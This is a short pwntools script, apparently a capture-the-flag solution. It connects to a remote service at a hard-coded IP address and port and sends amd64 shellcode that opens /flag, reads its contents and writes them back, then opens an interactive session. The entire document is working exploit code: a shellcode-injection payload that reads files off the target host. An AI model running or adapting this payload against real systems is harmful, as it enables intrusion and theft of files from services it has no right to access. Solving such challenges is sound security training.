from pwn import *
context(arch="amd64", os="linux", log_level="debug")
s=remote("47.97.58.52",42012)
shellcode=shellcraft.open("/flag",0,0)+shellcraft.read(3,"rsp",0x100)+shellcraft.write(1,"rsp",0x100)
s.sendafter("run: ",asm(shellcode).rjust(0x100,b"\x91"))
s.interactive()
